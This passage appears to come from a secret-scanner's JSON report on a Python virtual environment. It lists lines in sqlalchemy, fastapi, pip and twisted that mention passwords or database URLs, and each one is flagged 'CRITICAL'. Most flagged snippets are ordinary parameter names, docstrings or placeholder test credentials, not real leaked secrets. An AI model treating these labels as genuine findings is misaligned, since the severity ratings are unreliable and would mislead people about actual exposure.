            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/testing/provision.py",
            "type": "database_urls",
            "line": 81,
            "severity": "CRITICAL",
            "context": "ad_provisioning()\n\n    if follower_ident:\n        db_url = follower_url_from_main(db_url, follower_ident)\n    db_opts = {}\n    update_db_op"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/testing/provision.py",
            "type": "database_urls",
            "line": 415,
            "severity": "CRITICAL",
            "context": "         line = line.strip()\n            db_name, db_url = line.split(\" \")\n            url_obj = sa_url.make_url(db_url)\n"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/testing/config.py",
            "type": "database_urls",
            "line": 35,
            "severity": "CRITICAL",
            "context": "ts = _requirements.SuiteRequirements()\n\ndb = None\ndb_url = None\ndb_opts = None\nfile_config = None\ntest_schema = N"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/testing/config.py",
            "type": "database_urls",
            "line": 370,
            "severity": "CRITICAL",
            "context": "hema_2, db_opts\n        _current = config\n        db_url = config.db.url\n        db_opts = config.db_opts\n        test_sch"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/engine/url.py",
            "type": "passwords",
            "line": 106,
            "severity": "CRITICAL",
            "context": "sername: Optional[str]\n    \"username string\"\n\n    password: Optional[str]\n    \"\"\"password, which is normally a string but m"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/engine/url.py",
            "type": "passwords",
            "line": 157,
            "severity": "CRITICAL",
            "context": ",\n        username: Optional[str] = None,\n        password: Optional[str] = None,\n        host: Optional[str] = None,\n     "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/engine/url.py",
            "type": "passwords",
            "line": 173,
            "severity": "CRITICAL",
            "context": "   :param username: The user name.\n        :param password: database password.  Is typically a string, but may\n       "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/engine/url.py",
            "type": "passwords",
            "line": 302,
            "severity": "CRITICAL",
            "context": ",\n        username: Optional[str] = None,\n        password: Optional[str] = None,\n        host: Optional[str] = None,\n     "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/engine/url.py",
            "type": "passwords",
            "line": 624,
            "severity": "CRITICAL",
            "context": "ine.URL` object as a string.\n\n        :param hide_password: Defaults to True.   The password is not shown\n         in "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/engine/url.py",
            "type": "passwords",
            "line": 628,
            "severity": "CRITICAL",
            "context": "    \"\"\"\n        return self.render_as_string(hide_password=hide_password)\n\n    def render_as_string(self, hide_password: bo"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/engine/url.py",
            "type": "passwords",
            "line": 636,
            "severity": "CRITICAL",
            "context": "includes additional options.\n\n        :param hide_password: Defaults to True.   The password is not shown\n         in "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/sql/schema.py",
            "type": "passwords",
            "line": 226,
            "severity": "CRITICAL",
            "context": "t None:\n                try:\n                    spwd = item._set_parent_with_dispatch\n                except AttributeError as err:\n   "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/testing/plugin/plugin_base.py",
            "type": "passwords",
            "line": 458,
            "severity": "CRITICAL",
            "context": "                  f\"{db_url.render_as_string(hide_password=False)}\\n\"\n                )\n\n    expanded_urls = list(provi"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mssql/pyodbc.py",
            "type": "passwords",
            "line": 102,
            "severity": "CRITICAL",
            "context": "Client 10.0};SERVER=dagger;DATABASE=test;UID=user;PWD=password\"\n    connection_url = URL.create(\n        \"mssql+p"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mysql/pyodbc.py",
            "type": "passwords",
            "line": 40,
            "severity": "CRITICAL",
            "context": "    \"DATABASE=mydb;\"\n        \"UID=root;\"\n        \"PWD=(whatever);\"\n        \"charset=utf8mb4;\"\n    )\n    params = url"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mysql/mysqldb.py",
            "type": "passwords",
            "line": 206,
            "severity": "CRITICAL",
            "context": "(\n                database=\"db\", username=\"user\", password=\"passwd\"\n            )\n\n        opts = url.translate_conne"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/emails/backend/smtp/client.py",
            "type": "passwords",
            "line": 24,
            "severity": "CRITICAL",
            "context": "self.user = kwargs.pop('user', None)\n        self.password = kwargs.pop('password', None)\n\n        SMTP.__init__(self, **kw"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/emails/backend/smtp/client.py",
            "type": "passwords",
            "line": 36,
            "severity": "CRITICAL",
            "context": ".user:\n                self.login(user=self.user, password=self.password)\n            self.ehlo_or_helo_if_needed()\n       "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "type": "passwords",
            "line": 1274,
            "severity": "CRITICAL",
            "context": "le.com\"\n        )\n        assert iri.to_text(with_password=False) == \"http://us her:@example.com\"\n        assert (\n"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/fastapi/security/http.py",
            "type": "passwords",
            "line": 26,
            "severity": "CRITICAL",
            "context": "notated[str, Doc(\"The HTTP Basic username.\")]\n    password: Annotated[str, Doc(\"The HTTP Basic password.\")]\n\n\nclass HTTPAuth"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/fastapi/security/http.py",
            "type": "passwords",
            "line": 214,
            "severity": "CRITICAL",
            "context": "ls_exc  # noqa: B904\n        username, separator, password = data.partition(\":\")\n        if not separator:\n            raise in"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/fastapi/security/http.py",
            "type": "passwords",
            "line": 217,
            "severity": "CRITICAL",
            "context": "   return HTTPBasicCredentials(username=username, password=password)\n\n\nclass HTTPBearer(HTTPBase):\n    \"\"\"\n    HTTP Be"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/fastapi/security/oauth2.py",
            "type": "passwords",
            "line": 86,
            "severity": "CRITICAL",
            "context": "            \"\"\"\n            ),\n        ],\n        password: Annotated[\n            str,\n            Form(),\n            "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/fastapi/security/oauth2.py",
            "type": "passwords",
            "line": 146,
            "severity": "CRITICAL",
            "context": "ype\n        self.username = username\n        self.password = password\n        self.scopes = scope.split()\n        self."
          },
          {
            "file": "test_env/lib/python3.12/site-packages/fastapi/security/oauth2.py",
            "type": "passwords",
            "line": 207,
            "severity": "CRITICAL",
            "context": "pec requires the exact field name \"username\".\n    password: password string. The OAuth2 spec requires the exact field "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/fastapi/security/oauth2.py",
            "type": "passwords",
            "line": 240,
            "severity": "CRITICAL",
            "context": "            \"\"\"\n            ),\n        ],\n        password: Annotated[\n            str,\n            Form(),\n            "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/fastapi/security/oauth2.py",
            "type": "passwords",
            "line": 301,
            "severity": "CRITICAL",
            "context": "_type,\n            username=username,\n            password=password,\n            scope=scope,\n            client_id=cl"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/fastapi/security/oauth2.py",
            "type": "passwords",
            "line": 464,
            "severity": "CRITICAL",
            "context": "= {}\n        flows = OAuthFlowsModel(\n            password=cast(Any, {\"tokenUrl\": tokenUrl, \"scopes\": scopes})\n       "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/fastapi/openapi/models.py",
            "type": "passwords",
            "line": 389,
            "severity": "CRITICAL",
            "context": " implicit: Optional[OAuthFlowImplicit] = None\n    password: Optional[OAuthFlowPassword] = None\n    clientCredentials: Optional[OAuthFlowC"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpcore/_async/http_proxy.py",
            "type": "passwords",
            "line": 139,
            "severity": "CRITICAL",
            "context": "tes(proxy_auth[0], name=\"proxy_auth\")\n            password = enforce_bytes(proxy_auth[1], name=\"proxy_auth\")\n            userpass = usernam"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpcore/_async/socks_proxy.py",
            "type": "passwords",
            "line": 166,
            "severity": "CRITICAL",
            "context": " if proxy_auth is not None:\n            username, password = proxy_auth\n            username_bytes = enforce_bytes(userna"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpcore/_sync/http_proxy.py",
            "type": "passwords",
            "line": 139,
            "severity": "CRITICAL",
            "context": "tes(proxy_auth[0], name=\"proxy_auth\")\n            password = enforce_bytes(proxy_auth[1], name=\"proxy_auth\")\n            userpass = usernam"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpcore/_sync/socks_proxy.py",
            "type": "passwords",
            "line": 166,
            "severity": "CRITICAL",
            "context": " if proxy_auth is not None:\n            username, password = proxy_auth\n            username_bytes = enforce_bytes(userna"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 93,
            "severity": "CRITICAL",
            "context": "g password from keyring for %s\", url)\n            password = self.keyring.get_password(url, username)\n            if password:\n              "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 94,
            "severity": "CRITICAL",
            "context": "eyring.get_password(url, username)\n            if password:\n                return username, password\n        return None\n\n    def s"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 120,
            "severity": "CRITICAL",
            "context": "L139\n        if username is not None:\n            password = self._get_password(url, username)\n            if password is not None:\n  "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 339,
            "severity": "CRITICAL",
            "context": "etloc from the url.\n        url, netloc, url_user_password = split_auth_netloc_from_url(\n            original_url,\n        )\n\n        # St"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 344,
            "severity": "CRITICAL",
            "context": "credentials embedded in the url\n        username, password = url_user_password\n        if username is not None and password is n"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 355,
            "severity": "CRITICAL",
            "context": "nfo:\n                index_url, _, index_url_user_password = index_info\n                logger.debug(\"Found index url %s\""
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 360,
            "severity": "CRITICAL",
            "context": "er_password[0] is not None:\n            username, password = index_url_user_password\n            if username is not None and password "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 402,
            "severity": "CRITICAL",
            "context": "t credentials from original url\n        username, password = self._get_new_credentials(original_url)\n\n        # If credentials not found, use any stor"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 421,
            "severity": "CRITICAL",
            "context": "            username = username or \"\"\n            password = password or \"\"\n\n            # Store any acquired credentia"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 437,
            "severity": "CRITICAL",
            "context": "edentials for this request\n        url, username, password = self._get_url_and_credentials(req.url)\n\n        # Set the url of the request to the url "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 462,
            "severity": "CRITICAL",
            "context": "           return auth[0], auth[1], False\n        password = ask_password(\"Password: \")\n        return username, password, Tr"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 485,
            "severity": "CRITICAL",
            "context": "       if self.use_keyring:\n            username, password = self._get_new_credentials(\n                resp.url,\n                allow_n"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 492,
            "severity": "CRITICAL",
            "context": "   if not self.prompting and not username and not password:\n            return resp\n\n        parsed = urllib.parse.urlparse(resp"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 499,
            "severity": "CRITICAL",
            "context": "     save = False\n        if not username and not password:\n            username, password, save = self._prompt_for_password(parsed"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 512,
            "severity": "CRITICAL",
            "context": "           username=username,\n                    password=password,\n                )\n\n        # Consume content and "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 429,
            "severity": "CRITICAL",
            "context": "f make_rev_args(\n        username: Optional[str], password: Optional[HiddenText]\n    ) -> CommandArgs:\n        \"\"\"\n        Return "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 442,
            "severity": "CRITICAL",
            "context": "rev_and_auth(url.secret)\n        username, secret_password = user_pass\n        password: Optional[HiddenText] = None\n   "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 443,
            "severity": "CRITICAL",
            "context": "    username, secret_password = user_pass\n        password: Optional[HiddenText] = None\n        if secret_password is not None:\n  "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 445,
            "severity": "CRITICAL",
            "context": "      if secret_password is not None:\n            password = hide_value(secret_password)\n        extra_args = self.make_rev_args(username,"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/vcs/subversion.py",
            "type": "passwords",
            "line": 98,
            "severity": "CRITICAL",
            "context": "f make_rev_args(\n        username: Optional[str], password: Optional[HiddenText]\n    ) -> CommandArgs:\n        extra_args: Command"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/vcs/subversion.py",
            "type": "passwords",
            "line": 103,
            "severity": "CRITICAL",
            "context": "extra_args += [\"--username\", username]\n        if password:\n            extra_args += [\"--password\", password]\n\n        return extra"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/truststore/_api.py",
            "type": "passwords",
            "line": 142,
            "severity": "CRITICAL",
            "context": "  keyfile: _StrOrBytesPath | None = None,\n        password: _PasswordType | None = None,\n    ) -> None:\n        return self"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/truststore/_api.py",
            "type": "passwords",
            "line": 145,
            "severity": "CRITICAL",
            "context": "(\n            certfile=certfile, keyfile=keyfile, password=password\n        )\n\n    def load_default_certs(\n        se"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/distlib/util.py",
            "type": "passwords",
            "line": 843,
            "severity": "CRITICAL",
            "context": "name = prefix\n        else:\n            username, password = prefix.split(':', 1)\n    if username:\n        username = unquote"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/distlib/util.py",
            "type": "passwords",
            "line": 846,
            "severity": "CRITICAL",
            "context": "name:\n        username = unquote(username)\n    if password:\n        password = unquote(password)\n    return username, password"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
            "type": "passwords",
            "line": 83,
            "severity": "CRITICAL",
            "context": " self.username = cfg.get('username')\n        self.password = cfg.get('password')\n        self.realm = cfg.get('realm', '"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
            "type": "passwords",
            "line": 320,
            "severity": "CRITICAL",
            "context": "      self.cert_file = cert_file\n        self.key_password = key_password\n        self.ssl_context = ssl_context\n        se"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
            "type": "passwords",
            "line": 354,
            "severity": "CRITICAL",
            "context": "      self.cert_reqs = cert_reqs\n        self.key_password = key_password\n        self.assert_hostname = assert_hostname\n  "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
            "type": "passwords",
            "line": 423,
            "severity": "CRITICAL",
            "context": "         certfile=self.cert_file,\n            key_password=self.key_password,\n            ca_certs=self.ca_certs,\n            c"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 967,
            "severity": "CRITICAL",
            "context": "      self.cert_reqs = cert_reqs\n        self.key_password = key_password\n        self.ca_certs = ca_certs\n        self.ca_"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 983,
            "severity": "CRITICAL",
            "context": "      key_file=self.key_file,\n                key_password=self.key_password,\n                cert_file=self.cert_file,\n       "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 1039,
            "severity": "CRITICAL",
            "context": "          key_file=self.key_file,\n            key_password=self.key_password,\n            **self.conn_kw\n        )\n\n        ret"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 53,
            "severity": "CRITICAL",
            "context": "   category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(userna"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 60,
            "severity": "CRITICAL",
            "context": "tin1\")\n\n    if isinstance(password, str):\n        password = password.encode(\"latin1\")\n\n    authstr = \"Basic \" + to_native_strin"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 81,
            "severity": "CRITICAL",
            "context": "d):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all("
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 112,
            "severity": "CRITICAL",
            "context": "d):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
            "type": "passwords",
            "line": 323,
            "severity": "CRITICAL",
            "context": "thorization\"]\n\n        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, pa"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
            "type": "passwords",
            "line": 329,
            "severity": "CRITICAL",
            "context": "f not scheme.startswith('https') and username and password:\n            headers[\"Proxy-Authorization\"] = _basic_auth_str(username, "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
            "type": "passwords",
            "line": 214,
            "severity": "CRITICAL",
            "context": "ower().startswith(\"socks\"):\n            username, password = get_auth_from_url(proxy)\n            manager = self.proxy_manager[proxy] ="
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
            "type": "passwords",
            "line": 218,
            "severity": "CRITICAL",
            "context": "               username=username,\n                password=password,\n                num_pools=self._pool_connections,"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
            "type": "passwords",
            "line": 427,
            "severity": "CRITICAL",
            "context": "       \"\"\"\n        headers = {}\n        username, password = get_auth_from_url(proxy)\n\n        if username:\n            headers[\"Proxy-"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 69,
            "severity": "CRITICAL",
            "context": "r)\n            else prompt\n        )\n        self.password = password\n        if choices is not None:\n            self."
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 136,
            "severity": "CRITICAL",
            "context": " prompt,\n            console=console,\n            password=password,\n            choices=choices,\n            show_def"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 203,
            "severity": "CRITICAL",
            "context": "\n        \"\"\"\n        return console.input(prompt, password=password, stream=stream)\n\n    def check_choice(self, value:"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 363,
            "severity": "CRITICAL",
            "context": "umber={result}\")\n\n        while True:\n            password = Prompt.ask(\n                \"Please enter a password [cyan](m"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 370,
            "severity": "CRITICAL",
            "context": "ompt.invalid]password too short\")\n        print(f\"password={password!r}\")\n\n        fruit = Prompt.ask(\"Enter a fruit\", cho"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
            "type": "passwords",
            "line": 2109,
            "severity": "CRITICAL",
            "context": "ires a str prompt). Defaults to True.\n            password: (bool, optional): Hide typed text. Defaults to False.\n  "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
            "type": "passwords",
            "line": 2117,
            "severity": "CRITICAL",
            "context": "t, markup=markup, emoji=emoji, end=\"\")\n        if password:\n            result = getpass(\"\", stream=stream)\n        else:\n      "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/ssl_.py",
            "type": "passwords",
            "line": 385,
            "severity": "CRITICAL",
            "context": "SLContext.load_verify_locations().\n    :param key_password:\n        Optional password if the keyfile is encrypted.\n    :param "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/socks.py",
            "type": "passwords",
            "line": 102,
            "severity": "CRITICAL",
            "context": "_socks_options[\"username\"],\n                proxy_password=self._socks_options[\"password\"],\n                proxy_rdns=self._socks"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/pyopenssl.py",
            "type": "passwords",
            "line": 473,
            "severity": "CRITICAL",
            "context": "def load_cert_chain(self, certfile, keyfile=None, password=None):\n        self._ctx.use_certificate_chain_file(cert"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/pyopenssl.py",
            "type": "passwords",
            "line": 477,
            "severity": "CRITICAL",
            "context": "tance(password, six.binary_type):\n                password = password.encode(\"utf-8\")\n            self._ctx.set_passwd_cb(lambda"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/securetransport.py",
            "type": "passwords",
            "line": 873,
            "severity": "CRITICAL",
            "context": "def load_cert_chain(self, certfile, keyfile=None, password=None):\n        self._client_cert = certfile\n        self"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/_securetransport/low_level.py",
            "type": "passwords",
            "line": 231,
            "severity": "CRITICAL",
            "context": "4.b16encode(random_bytes[:8]).decode(\"utf-8\")\n    password = base64.b16encode(random_bytes[8:])  # Must be valid UTF-8\n    tempdirectory = tempfi"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/protocols/ftp.py",
            "type": "passwords",
            "line": 2891,
            "severity": "CRITICAL",
            "context": "def __init__(\n        self, username=\"anonymous\", password=\"twisted@twistedmatrix.com\", passive=1\n    ):\n        \"\"\"\n        Constructor"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/protocols/sip.py",
            "type": "passwords",
            "line": 325,
            "severity": "CRITICAL",
            "context": " = username\n        self.host = host\n        self.password = password\n        self.port = port\n        self.transport ="
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py",
            "type": "passwords",
            "line": 148,
            "severity": "CRITICAL",
            "context": "\n        self.username = \"test-user\"\n        self.password = \"test-password\"\n        users_checker.addUser(self.username, self"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_adbapi.py",
            "type": "passwords",
            "line": 457,
            "severity": "CRITICAL",
            "context": "        database=self.DB_NAME, user=self.DB_USER, password=self.DB_PASS\n            )\n            conn.close()\n          "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_adbapi.py",
            "type": "passwords",
            "line": 485,
            "severity": "CRITICAL",
            "context": "        database=self.DB_NAME, user=self.DB_USER, password=self.DB_PASS\n            )\n            conn.close()\n          "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_adbapi.py",
            "type": "passwords",
            "line": 517,
            "severity": "CRITICAL",
            "context": "              db=self.DB_NAME, user=self.DB_USER, passwd=self.DB_PASS\n            )\n            conn.close()\n          "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_adbapi.py",
            "type": "passwords",
            "line": 577,
            "severity": "CRITICAL",
            "context": ".0.1\",\n            user=self.DB_USER,\n            password=self.DB_PASS,\n        )\n        conn.drop_database()\n\n\ndef make"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/credentials.py",
            "type": "passwords",
            "line": 73,
            "severity": "CRITICAL",
            "context": "ials against the correct password.\n\n        @type password: L{bytes}\n        @param password: The correct, plaintext p"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/credentials.py",
            "type": "passwords",
            "line": 97,
            "severity": "CRITICAL",
            "context": "ame associated with these credentials.\n\n    @type password: L{bytes}\n    @ivar password: The password associated with "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/credentials.py",
            "type": "passwords",
            "line": 104,
            "severity": "CRITICAL",
            "context": " bytes\n    password: bytes\n\n    def checkPassword(password: bytes) -> bool:\n        \"\"\"\n        Validate these crede"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/credentials.py",
            "type": "passwords",
            "line": 108,
            "severity": "CRITICAL",
            "context": "ials against the correct password.\n\n        @type password: L{bytes}\n        @param password: The correct, plaintext p"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/credentials.py",
            "type": "passwords",
            "line": 447,
            "severity": "CRITICAL",
            "context": "nter(IUsernameHashedPassword)\nclass UsernameHashedPassword:\n    deprecatedModuleAttribute(\n        Version(\"Twisted\", 21, 2, 0),\n        \"Us"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/credentials.py",
            "type": "passwords",
            "line": 465,
            "severity": "CRITICAL",
            "context": "Password:\n    def __init__(self, username: bytes, password: bytes) -> None:\n        self.username = username\n       "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/credentials.py",
            "type": "passwords",
            "line": 467,
            "severity": "CRITICAL",
            "context": "ne:\n        self.username = username\n        self.password = password\n\n    def checkPassword(self, password: bytes) -> "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/credentials.py",
            "type": "passwords",
            "line": 469,
            "severity": "CRITICAL",
            "context": ".password = password\n\n    def checkPassword(self, password: bytes) -> bool:\n        return self.password == password"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/checkers.py",
            "type": "passwords",
            "line": 128,
            "severity": "CRITICAL",
            "context": ".items()}\n\n    def addUser(self, username: bytes, password: bytes) -> None:\n        \"\"\"\n        Set a user's passwor"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/checkers.py",
            "type": "passwords",
            "line": 135,
            "severity": "CRITICAL",
            "context": "\n        @type username: L{bytes}\n\n        @param password: Password to associate with the username.\n        @type pas"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/checkers.py",
            "type": "passwords",
            "line": 136,
            "severity": "CRITICAL",
            "context": "ord to associate with the username.\n        @type password: L{bytes}\n        \"\"\"\n        self.users[username] = passwo"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/cred/strcred.py",
            "type": "passwords",
            "line": 12,
            "severity": "CRITICAL",
            "context": "fferent\ncheckers available to cred.\n\nExamples:\n - passwd:/etc/passwd\n - memory:admin:asdf:user:lkj\n - unix\n\"\"\"\n\n\nimpor"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/util.py",
            "type": "passwords",
            "line": 352,
            "severity": "CRITICAL",
            "context": " obtain a TTY\")\n            else:\n                password = sys.stdin.readline()\n                if password[-1] == \"\\n\":\n        "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/util.py",
            "type": "passwords",
            "line": 354,
            "severity": "CRITICAL",
            "context": "     if password[-1] == \"\\n\":\n                    password = password[:-1]\n                return password\n\n        while 1:"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/fakepwd.py",
            "type": "passwords",
            "line": 32,
            "severity": "CRITICAL",
            "context": "None:\n        self.pw_name = name\n        self.pw_passwd = password\n        self.pw_uid = uid\n        self.pw_gid = g"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/fakepwd.py",
            "type": "passwords",
            "line": 160,
            "severity": "CRITICAL",
            "context": "e:\n        self.sp_nam = username\n        self.sp_pwd = password\n        self.sp_lstchg = lastChange\n        self."
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/tksupport.py",
            "type": "passwords",
            "line": 61,
            "severity": "CRITICAL",
            "context": "t twisted.python.util\n\n    twisted.python.util.getPassword = getPassword\n\n\ndef getPassword(prompt=\"\", confirm=0):\n    whil"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/plugins/cred_unix.py",
            "type": "passwords",
            "line": 73,
            "severity": "CRITICAL",
            "context": "s it matches\n        C{password}.\n\n        @param pwd: Module which provides functions which\n                  "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/plugins/cred_unix.py",
            "type": "passwords",
            "line": 75,
            "severity": "CRITICAL",
            "context": "cess to the Unix password database.\n        @type pwd: C{module}\n        @param username: The user to look up in t"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/plugins/cred_unix.py",
            "type": "passwords",
            "line": 100,
            "severity": "CRITICAL",
            "context": " matches it matches C{password}.\n\n        @param spwd: Module which provides functions which\n                  "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/plugins/cred_unix.py",
